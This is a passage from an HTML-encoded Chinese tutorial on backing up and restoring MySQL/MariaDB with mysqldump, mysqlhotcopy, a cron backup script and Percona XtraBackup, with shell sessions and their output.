#&#x5BFC;&#x5165;&#x4E0D;&#x7528;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x540D;</code></pre><p>&#x5BFC;&#x5165;&#x6570;&#x636E;&#xFF1A;<br>A&#xFF1A;&#x5BFC;&#x5165;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;</p><pre><code>mysql -uroot -pJaking@vip.163.com &lt; all.sql</code></pre><p>B&#xFF1A;&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;</p><pre><code class="shell">mysql -uroot -pJaking@vip.163.com testdb &lt; testdb.sql  #&#x5982;&#x679C;&#x5BFC;&#x5165;&#x65F6;&#xFF0C;&#x6CA1;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x9700;&#x8981;&#x4F60;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E0B;</code></pre><p>mysql&gt; create database testdb;</p><p>&#x4F7F;&#x7528;source&#x5BFC;&#x5165;<br>mysql&gt; drop database testdb;<br>mysql&gt; create database testdb;<br>mysql&gt; use testdb;<br>mysql&gt; source /tmp/testdb.sql</p><p>C:&#x5BFC;&#x5165;&#x8868;<br>mysql&gt; drop table testdb.book1;<br>mysql&gt; source /tmp/testdb.book1.sql;   #&#x5BFC;&#x5165;&#x8868;&#x65F6;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x521B;&#x5EFA;&#x8868;&#xFF0C;&#x8981;&#x5148;&#x8FDB;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;<br>mysql&gt; select * from testdb.book1;</p><p>D&#xFF1A;&#x5BFC;&#x5165;&#x8868;&#x7ED3;&#x6784;&#x548C;&#x6570;&#x636E;<br>mysql&gt; create database testdb;<br>mysql -uroot <a href="mailto:-pJaking@vip.163.com" target="_blank" rel="noopener">-pJaking@vip.163.com</a> testdb &lt; testdbtable.sql<br>mysql -uroot <a href="mailto:-pJaking@vip.163.com" target="_blank" rel="noopener">-pJaking@vip.163.com</a> testdb &lt; testdbdata.sql</p><p>mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;</p><p>&#x6587;&#x6863;&#xFF1A;10 mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;.md<br>&#x94FE;&#x63A5;&#xFF1A;<a href="http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C</a></p><p>&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;<br>mysqldump -h ip_addr -u db_user -p db_name &gt; file_name.sql<br>&#x8FDC;&#x7A0B;&#x6062;&#x590D;<br>mysql -h ip_addr -u db_user -p &lt; db_file.sql</p><p>3) mysqlhotcopy &#x88F8;&#x6587;&#x4EF6;&#x5907;&#x4EFD;    </p><p>&#x6CE8;&#x610F;&#xFF1A;5.7&#x7248;&#x672C;&#x5DF2;&#x7ECF;&#x53BB;&#x6389;&#x6B64;&#x547D;&#x4EE4;&#xFF0C;&#x8BF7;&#x5728;5.5&#x53CA;&#x4EE5;&#x4E0B;&#x7248;&#x672C;&#x6D4B;&#x8BD5;&#xFF01;<br>mysqlhotcopy&#x4F7F;&#x7528;lock tables&#x3001;flush tables&#x548C;cp&#x6216;scp&#x6765;&#x5FEB;&#x901F;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B83;&#x662F;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x6216;&#x5355;&#x4E2A;&#x8868;&#x6700;&#x5FEB;&#x7684;&#x9014;&#x5F84;,&#x5B8C;&#x5168;&#x5C5E;&#x4E8E;&#x7269;&#x7406;&#x5907;&#x4EFD;,&#x4F46;&#x53EA;&#x80FD;&#x7528;&#x4E8E;&#x5907;&#x4EFD;MyISAM&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C;&#x8FD0;&#x884C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x6240;&#x5728;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4E0E;mysqldump&#x5907;&#x4EFD;&#x4E0D;&#x540C;,mysqldump&#x5C5E;&#x4E8E;&#x903B;&#x8F91;&#x5907;&#x4EFD;,&#x6062;&#x590D;&#x65F6;&#x662F;&#x6267;&#x884C;&#x7684;sql&#x8BED;&#x53E5;&#x3002;</p><p>mysqlhotcopy&#x672C;&#x8D28;&#x662F;&#x4F7F;&#x7528;&#x9501;&#x8868;&#x8BED;&#x53E5;&#x540E;&#x518D;&#x4F7F;&#x7528;cp&#x6216;scp&#x62F7;&#x8D1D;&#x6570;&#x636E;&#x5E93;</p><p>1.&#x5B89;&#x88C5;mysqlhotcopy</p><p>yum provides mysqlhotcopy<br>yum install -y mariadb-server</p><p>2.&#x67E5;&#x770B;mysqlhotcopy&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</p><p>mysqlhotcopy &#x2013;help<br>  &#x2013;allowold   don&#x2019;t abort if target dir already exists (rename it _old) &#x2013;&#x4E0D;&#x8986;&#x76D6;&#x4EE5;&#x524D;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;<br>  &#x2013;addtodest  don&#x2019;t rename target dir if it exists, just add files to it      &#x2013;&#x5C5E;&#x4E8E;&#x589E;&#x91CF;&#x5907;&#x4EFD;<br>  &#x2013;noindices   don&#x2019;t include full index files in copy          &#x2013;&#x4E0D;&#x5907;&#x4EFD;&#x7D22;&#x5F15;&#x6587;&#x4EF6;<br>  &#x2013;debug     enable debug                                 &#x2013;&#x542F;&#x7528;&#x8C03;&#x8BD5;&#x8F93;&#x51FA;<br>  &#x2013;regexp=#   copy all databases with names matching regexp  &#x2013;&#x4F7F;&#x7528;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;<br>  &#x2013;checkpoint=#  insert checkpoint entry into specified db.table    &#x2013;&#x63D2;&#x5165;&#x68C0;&#x67E5;&#x70B9;&#x6761;&#x76EE;<br>  &#x2013;flushlog      flush logs once all tables are locked          &#x2013;&#x6240;&#x6709;&#x8868;&#x9501;&#x5B9A;&#x540E;&#x5237;&#x65B0;&#x65E5;&#x5FD7;<br>  &#x2013;resetmaster    reset the binlog once all tables are locked     &#x2013;&#x4E00;&#x65E6;&#x9501;&#x8868;&#x91CD;&#x7F6E;binlog&#x6587;&#x4EF6;<br>  &#x2013;resetslave  reset the master.info once all tables are locked  &#x2013;&#x4E00;&#x65E6;&#x9501;&#x8868;&#x91CD;&#x7F6E;master.info&#x6587;&#x4EF6; </p><p>&#x4E3E;&#x4F8B;&#x8BF4;&#x660E;&#xFF1A;<br>A&#xFF1A;&#x5907;&#x4EFD;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5230;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;<br>mysqlhotcopy -u root -p <a href="mailto:Jaking@vip.163.com" target="_blank" rel="noopener">Jaking@vip.163.com</a> BOOK /tmp  #-u -p &#x540E;&#x9762;&#x90FD;&#x6709;&#x7A7A;&#x683C;</p><p>[root@jaking ~]# mysqlhotcopy -u root -p <a href="mailto:Jaking@vip.163.com" target="_blank" rel="noopener">Jaking@vip.163.com</a> BOOK /tmp<br>Flushed 1 tables with read lock (<code>BOOK</code>.<code>book</code>) in 0 seconds.<br>Locked 0 views () in 0 seconds.<br>Copying 2 files&#x2026;<br>Copying indices for 0 files&#x2026;<br>Unlocked tables.<br>mysqlhotcopy copied 1 tables (2 files) in 0 seconds (0 seconds overall).<br>[root@jaking ~]# ls /tmp<br>BOOK<br>[root@jaking ~]# ls /tmp/BOOK/<br>book.frm  db.opt</p><p>&#x5BF9;&#x6BD4;&#x4E0B;&#x5927;&#x5C0F;</p><p>[root@jaking ~]# du -sh /var/lib/mysql/BOOK/ /tmp/BOOK/<br>16K     /var/lib/mysql/BOOK/<br>16K     /tmp/BOOK/</p><p>B&#xFF1A;&#x5907;&#x4EFD;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5230;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;</p><pre><code class="shell">[root@jaking ~]# rm -rf /tmp/*[root@jaking ~]# mysqlhotcopy -u root -p Jaking@vip.163.com BOOK mysql /tmp/mysqlhotcopy -u root -p Jaking@vip.163.com BOOK mysql /tmp/Flushed 23 tables with read lock (`BOOK`.`book`, `mysql`.`columns_priv`, `mysql`.`db`, `mysql`.`event`, `mysql`.`func`, `mysql`.`help_category`, `mysql`.`help_keyword`, `mysql`.`help_relation`, `mysql`.`help_topic`, `mysql`.`host`, `mysql`.`ndb_binlog_index`, `mysql`.`plugin`, `mysql`.`proc`, `mysql`.`procs_priv`, `mysql`.`proxies_priv`, `mysql`.`servers`, `mysql`.`tables_priv`, `mysql`.`time_zone`, `mysql`.`time_zone_leap_second`, `mysql`.`time_zone_name`, `mysql`.`time_zone_transition`, `mysql`.`time_zone_transition_type`, `mysql`.`user`) in 0 seconds.Locked 0 views () in 0 seconds.Copying 2 files...Copying indices for 0 files...Copying 72 files...Copying indices for 0 files...Unlocked tables.mysqlhotcopy copied 24 tables (74 files) in 0 seconds (0 seconds overall).[root@jaking ~]# ls /tmpBOOK  mysql[root@jaking ~]# du -h /tmp 0       /tmp/.X11-unix0       /tmp/.font-unix0       /tmp/.ICE-unix0       /tmp/.XIM-unix0       /tmp/.Test-unix16K     /tmp/BOOK1004K   /tmp/mysql1020K   /tmp[root@jaking ~]# du -h /var/lib/mysql/1004K   /var/lib/mysql/mysql212K    /var/lib/mysql/performance_schema16K     /var/lib/mysql/BOOK30M     /var/lib/mysql/</code></pre><p>C&#xFF1A;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x8868;<br>&#x8BED;&#x6CD5;&#xFF1A;mysqlhotcopy -u &#x7528;&#x6237; -p &#x5BC6;&#x7801; &#x6570;&#x636E;&#x5E93;&#x540D;./&#x8981;&#x5907;&#x4EFD;&#x7684;&#x8868;&#x540D;/  &#x8981;&#x5907;&#x4EFD;&#x7684;&#x8DEF;&#x5F84;</p><p>mysqlhotcopy -u root -p <a href="mailto:Jaking@vip.163.com" target="_blank" rel="noopener">Jaking@vip.163.com</a> BOOK./book/ /tmp/   #&#x6CE8;&#x610F;&#x6700;&#x540E;&#x7684; / &#x4E00;&#x5B9A;&#x8981;&#x6709;&#xFF01;<br>&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x628A;&#x5BF9;&#x5E94;&#x7684;&#x8868;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/tmp&#x76EE;&#x5F55;&#x4E0B;</p><pre><code class="shell">[root@jaking ~]# rm -rf *[root@jaking ~]# mysqlhotcopy -u root -p Jaking@vip.163.com BOOK./book/ /tmp/   Flushed 1 tables with read lock (`BOOK`.`book`) in 0 seconds.Locked 0 views () in 0 seconds.Copying 1 files...Copying indices for 0 files...Unlocked tables.mysqlhotcopy copied 1 tables (1 files) in 0 seconds (0 seconds overall).[root@jaking ~]# ls BOOK/book.frm[root@jaking ~]# ll /tmp/BOOK/total 12-rw-rw---- 1 mysql mysql 8624 Apr 22 14:31 book.frm</code></pre><p>D:&#x6062;&#x590D;&#x6570;&#x636E;</p><p>&#x7834;&#x574F;&#x6570;&#x636E;</p><pre><code class="shell">[root@jaking tmp]# cd /var/lib/mysql/[root@jaking mysql]# lsaria_log.00000001  BOOK     ib_logfile0  mysql       performance_schemaaria_log_control   ibdata1  ib_logfile1  mysql.sock[root@jaking mysql]# rm -rf BOOK/[root@jaking mysql]# lsaria_log.00000001  ibdata1      ib_logfile1  mysql.sockaria_log_control   ib_logfile0  mysql        performance_schema[root@jaking mysql]#[root@jaking ~]# mysql -uroot -pJaking@vip.163.comWelcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 39Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema |+--------------------+3 rows in set (0.00 sec)MariaDB [(none)]&gt;</code></pre><p>&#x5F00;&#x59CB;&#x6062;&#x590D;</p><pre><code class="shell">[root@jaking mysql]# cp -ra /tmp/BOOK/ /var/lib/mysql/[root@jaking mysql]# ll /var/lib/mysql/total 28700-rw-rw---- 1 mysql mysql    16384 Apr 22 14:29 aria_log.00000001-rw-rw---- 1 mysql mysql       52 Apr 22 14:29 aria_log_controldrwxr-x--- 2 mysql mysql       22 Apr 22 14:53 BOOK-rw-rw---- 1 mysql mysql 18874368 Apr 22 14:53 ibdata1-rw-rw---- 1 mysql mysql  5242880 Apr 22 14:53 ib_logfile0-rw-rw---- 1 mysql mysql  5242880 Apr 22 14:29 ib_logfile1drwx------ 2 mysql mysql     4096 Apr 22 14:29 mysqlsrwxrwxrwx 1 mysql mysql        0 Apr 22 14:29 mysql.sockdrwx------ 2 mysql mysql     4096 Apr 22 14:29 performance_schema[root@jaking mysql]# chown -Rf mysql:mysql /var/lib/mysql/BOOK/[root@jaking ~]# mysql -uroot -pJaking@vip.163.comWelcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 40Server version: 5.5.52-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">MariaDB [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || mysql              || performance_schema |+--------------------+4 rows in set (0.00 sec)MariaDB [(none)]&gt; use BOOK;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [BOOK]&gt; show tables;+----------------+| Tables_in_BOOK |+----------------+| book           |+----------------+1 row in set (0.00 sec)MariaDB [BOOK]&gt; select * from book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)MariaDB [BOOK]&gt; </code></pre><p>&#x603B;&#x7ED3;&#xFF1A;<br>mysqldump&#x548C;mysqlhotcopy&#x7684;&#x6BD4;&#x8F83;&#xFF1A;<br>1&#x3001;mysqldump &#x662F;&#x91C7;&#x7528;SQL&#x7EA7;&#x522B;&#x7684;&#x5907;&#x4EFD;&#x673A;&#x5236;&#xFF0C;&#x5B83;&#x5C06;&#x6570;&#x636E;&#x8868;&#x5BFC;&#x6210; SQL &#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5927;&#x65F6;&#xFF0C;&#x5360;&#x7528;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x8F83;&#x591A;&#xFF0C;&#x652F;&#x6301;&#x5E38;&#x7528;&#x7684;MyISAM&#xFF0C;Innodb<br>2&#x3001;mysqlhotcopy&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x7F13;&#x5B58;&#x5199;&#x5165;&#x548C;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x5360;&#x7528;&#x8D44;&#x6E90;&#x548C;&#x5907;&#x4EFD;&#x901F;&#x5EA6;&#x6BD4;mysqldump&#x5FEB;&#x5F88;&#x591A;&#xFF1B;&#x7279;&#x522B;&#x9002;&#x5408;&#x5927;&#x7684;&#x6570;&#x636E;&#x5E93;<br>3&#x3001;mysqlhotcopy&#x53EA;&#x80FD;&#x8FD0;&#x884C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x6240;&#x5728;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF0C;mysqldump&#x53EF;&#x4EE5;&#x7528;&#x5728;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;<br>4&#x3001;&#x76F8;&#x540C;&#x7684;&#x5730;&#x65B9;&#x90FD;&#x662F;&#x5728;&#x7EBF;&#x6267;&#x884C;LOCK TABLES &#x4EE5;&#x53CA; UNLOCK TABLES<br>5&#x3001;mysqlhotcopy&#x6062;&#x590D;&#x53EA;&#x9700;&#x8981;COPY&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5230;&#x6E90;&#x76EE;&#x5F55;&#x8986;&#x76D6;&#x5373;&#x53EF;&#xFF0C;mysqldump&#x9700;&#x8981;&#x5BFC;&#x5165;SQL&#x6587;&#x4EF6;&#x5230;&#x539F;&#x6765;&#x5E93;&#x4E2D;</p><p>&#x5B9E;&#x6218;&#xFF1A;&#x5199;&#x4E2A;&#x81EA;&#x52A8;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5E93;shell&#x811A;&#x672C;<br>vim  mysql-autoback.sh </p><p>#!/bin/bash<br>export LANG=en_US.UTF-8<br>mkdir /database_back &amp;&gt;/dev/null<br>savedir=/database_back<br>cd &#x201C;$savedir&#x201D;<br>time=&#x201D;$(date +&#x201D;%Y-%m-%d&#x201D;)&#x201D;<br>mysqldump -u root <a href="mailto:-pJaking@vip.163.com" target="_blank" rel="noopener">-pJaking@vip.163.com</a> book &gt; book-&#x201C;$time&#x201D;.sql  </p><p>&#x518D;&#x6DFB;&#x52A0;&#x8BA1;&#x5212;&#x4EFB;&#x52A1; crontab &#x5C31;&#x884C;</p><p>xtrabackup&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#x4F7F;&#x7528;</p><p>1&#x3001;xtrabackup&#x7B80;&#x4ECB;</p><p>Xtrabackup&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x4E3B;&#x8981;&#x5DE5;&#x5177;&#xFF1A;Xtrabackup&#x548C;innobackupex&#xFF1A;<br>Xtrabackup&#x53EA;&#x80FD;&#x5907;&#x4EFD;InnoDB&#x548C;XtraDB&#x4E24;&#x79CD;&#x5F15;&#x64CE;&#x8868;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x5907;&#x4EFD;MyISAM&#x6570;&#x636E;&#x8868;</p><p>&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;&#x9488;&#x5BF9;InnoDB&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;MySQL&#x672C;&#x8EAB;&#x6CA1;&#x6709;&#x63D0;&#x4F9B;&#x5408;&#x9002;&#x7684;&#x70ED;&#x5907;&#x5DE5;&#x5177;&#xFF0C;ibbackup&#x867D;&#x662F;&#x4E00;&#x6B3E;&#x9AD8;&#x6548;&#x7684;&#x9996;&#x9009;&#x70ED;&#x5907;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x5B83;&#x662F;&#x662F;&#x6536;&#x8D39;&#x7684;&#x3002;&#x597D;&#x5728;Percona&#x516C;&#x53F8;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#x7684;Xtrabackup&#x70ED;&#x5907;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x53EF;&#x5B9E;&#x73B0;ibbackup&#x7684;&#x6240;&#x6709;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x6269;&#x5C55;&#x652F;&#x6301;&#x771F;&#x6B63;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x529F;&#x80FD;&#xFF0C;&#x662F;&#x5546;&#x4E1A;&#x5907;&#x4EFD;&#x5DE5;&#x5177;InnoDB Hotbackup&#x7684;&#x4E00;&#x4E2A;&#x5F88;&#x597D;&#x7684;&#x66FF;&#x4EE3;&#x54C1;&#x3002;</p><p>2&#x3001;Percona-XtraBackup &#x5B89;&#x88C5; &#xFF08;mysql5.7.20&#x9700;&#x5B89;&#x88C5;XtraBackup2.4.9&#xFF09;</p><p>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;<br> [root@jaking ~]# wget <a href="https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar" target="_blank" rel="noopener">https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar</a> </p><p>&#x89E3;&#x538B;&#x5305;<br>[root@jaking ~]# tar -xvf Percona-XtraBackup-2.4.9-ra467167cdd4-el7-x86_64-bundle.tar </p><p>yum&#x5B89;&#x88C5;&#x5E76;&#x89E3;&#x51B3;&#x4F9D;&#x8D56;&#xFF1A;<br>yum -y localinstall percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm </p><p>&#x6216;&#x8005;<br>yum install -y <a href="https://repo.percona.com/yum/percona-release-latest.noarch.rpm" target="_blank" rel="noopener">https://repo.percona.com/yum/percona-release-latest.noarch.rpm</a></p><p>&#x6216;&#x8005;<br>rpm -ivh percona-release-latest.noarch.rpm</p><p>yum install -y percona-xtrabackup-24.x86_64</p><p>&#x5982;&#x679C;&#x51FA;&#x73B0;&#x4EE5;&#x4E0B;&#x62A5;&#x9519;&#xFF1A;<br>Error: Package: percona-xtrabackup-24-2.4.22-1.el7.x86_64 (percona-release-x86_64)<br>           Requires: libev.so.4()(64bit)</p><p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</p><pre><code class="shell">[root@jaking ~]# wget ftp://rpmfind.net/linux/atrpms/el6-x86_64/atrpms/stable/libev-4.04-2.el6.x86_64.rpm[root@jaking ~]# rpm -ivh libev-4.04-2.el6.x86_64.rpm [root@jaking ~]# rzrz waiting to receive. zmodem trl+C &#x221;  100%    7805 KB 7805 KB/s 00:00:01       0 Errors2.4.22-1.el7.x86_64.rpm...[root@jaking ~]# ls -hltotal 7.7M-rw-r--r--  1 root root  38K May 13 09:36 libev-4.04-2.el6.x86_64.rpm-rwxr-xr-x. 1 root root  937 Apr 23 03:57 named.sh-rw-r--r--  1 root root 7.7M Mar 10 04:56 percona-xtrabackup-24-2.4.22-1.el7.x86_64.rpm&#x6216;&#x8005;[root@jaking ~]# yum install -y percona-xtrabackup #&#x5907;&#x9009;&#x65B9;&#x6848;&#x6216;&#x8005;[root@jaking ~]# rpm -ivh mysql-community-libs-compat-5.7.20-1.el7.x86_64.rpm[root@jaking ~]# yum install -y cmake gcc gcc-c++ libaio libaio-devel automake autoconf bzr rsync[root@jaking ~]# yum  install -y perl perl-devel libaio libaio-devel perl-Time-HiRes perl-DBD-MySQL  perl-Digest-MD5[root@jaking ~]# rpm -ivh percona-xtrabackup-24-2.4.22-1.el7.x86_64.rpmPreparing...                          ################################# [100%]Updating / installing...   1:percona-xtrabackup-24-2.4.22-1.el################################# [100%][root@jaking ~]# which xtrabackup/usr/bin/xtrabackup[root@jaking ~]# xtrabackup --versionxtrabackup: recognized server arguments: --datadir=/var/lib/mysql xtrabackup version 2.4.22 based on MySQL server 5.7.32 Linux (x86_64) (revision id: c99a781)&#x6CE8;&#x610F;&#xFF1A;my.cnf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x91CC;datadir&#x6307;&#x5B9A;&#x7684;MySQL&#x6570;&#x636E;&#x8DEF;&#x5F84;[root@jaking ~]#cat /etc/my.cnf[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidskip-name-resolve[root@jaking ~]# systemctl restart mysqld  </code></pre><p><span style="color:orange">fnaichu:</span><br>&#x5148;&#x5B89;&#x88C5;epel&#x6E90;<br>yum install -y epel-release</p><p>&#x5B89;&#x88C5;MySQL&#xFF0C;&#x786E;&#x4FDD;&#x81F3;&#x5C11;&#x5B89;&#x88C5;&#x6709;&#x4EE5;&#x4E0B;5&#x4E2A;&#x5305;&#xFF1A;</p><p>&#x5B89;&#x88C5;xtrabackup:<br>&#x53C2;&#x8003;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF1A;<a href="https://docs.percona.com/percona-xtrabackup/2.4/installation/yum_repo.html" target="_blank" rel="noopener">https://docs.percona.com/percona-xtrabackup/2.4/installation/yum_repo.html</a></p><p>&#x5B89;&#x88C5;xtrabackup&#x4F9D;&#x8D56;&#x5305;<br>yum install <a href="https://repo.percona.com/yum/percona-release-latest.noarch.rpm" target="_blank" rel="noopener">https://repo.percona.com/yum/percona-release-latest.noarch.rpm</a></p><p>&#x4E0B;&#x8F7D;xtrabackup&#x5B89;&#x88C5;&#x5305;<br>wget <a href="https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/\" target="_blank" rel="noopener">https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/\</a><br>binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm</p><p>&#x5B89;&#x88C5;xtrabackup<br>yum localinstall percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm</p><p>3&#x3001;xtrbackup&#x4F7F;&#x7528;<br>&#x4E00;&#x822C;&#x4F7F;&#x7528;innobackupex&#x811A;&#x672C;<br>innobackupex&#x662F;perl&#x811A;&#x672C;&#x5BF9;xtrabackup&#x7684;&#x5C01;&#x88C5;&#x548C;&#x529F;&#x80FD;&#x6269;&#x5C55;</p><p>&#x5907;&#x4EFD;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#xFF1A;<br>&#x6743;&#x9650;&#x548C;&#x8FDE;&#x63A5;<br>xtrabackup&#x9700;&#x8981;&#x8FDE;&#x63A5;&#x5230;&#x6570;&#x636E;&#x5E93;&#x548C;datadir&#x64CD;&#x4F5C;&#x6743;&#x9650;<br>xtrabackup&#x6216;&#x8005;innobackupex&#x5728;&#x4F7F;&#x7528;&#x8FC7;&#x7A0B;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x4E24;&#x7C7B;&#x7528;&#x6237;&#x6743;&#x9650;</p><p>1.&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#xFF0C;&#x7528;&#x6765;&#x8C03;&#x7528;innobackupex&#x6216;&#x8005;xtrabackup</p><p>2.&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5185;&#x4F7F;&#x7528;&#x7684;&#x7528;&#x6237;</p><pre><code>  &#x5176;&#x4ED6;&#x8FDE;&#x63A5;&#x9009;&#x9879;&#xFF1A;</code></pre><p>| &#x70B9;&#x51FB;&#x8FD9;&#x91CC; | &#x70B9;&#x51FB;&#x8FD9;&#x91CC; |<br>|    Tmpion<br>    |    Description<br>    |<br>|   &#x2013;port<br>   |   The port to use when connecting to the database   server with TCP/IP.<br>   |<br>|   &#x2013;socket<br>   |   The socket to use when   connecting to the local database.<br>   |<br>|   &#x2013;host<br>   |   The host to use when connecting   to the database server with TCP/IP.<br>   |</p><p>&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x521B;&#x5EFA;&#x7528;&#x6765;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x5B89;&#x5168;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x5BF9;&#x5E94;&#x7684;&#x6743;&#x9650;</p><p>4&#x3001;&#x5168;&#x5907;&#x548C;&#x5168;&#x5907;&#x8FD8;&#x539F;</p><p>&#x4F7F;&#x7528;innobackupex&#x521B;&#x5EFA;&#x5168;&#x5907;</p><p>&#x521B;&#x5EFA;&#x5168;&#x5907;&#xFF1A;<br>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> /tmp/db_backup/<br>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> /tmp/db_backup/ &amp;&gt;&gt;/tmp/db_backup.log<br>&amp;&gt;&gt;/tmp/db_backup.log   #&#x4E0D;&#x663E;&#x793A;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#xFF0C;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x91CD;&#x5B9A;&#x5411;&#x5230;db_backup.log</p><p>[root@jaking ~]# ls /tmp<br>db_backup  db_backup.log  percona-version-check<br>[root@jaking ~]# ls /tmp/db_backup<br>2021-05-14_08-08-38<br>[root@jaking ~]# ls /tmp/db_backup/2021-05-14_08-08-38/<br>backup-my.cnf   ibdata1             sys                     xtrabackup_info<br>book1           market              testbookdb              xtrabackup_logfile<br>book2           mysql               testdb<br>ib_buffer_pool  performance_schema  xtrabackup_checkpoints 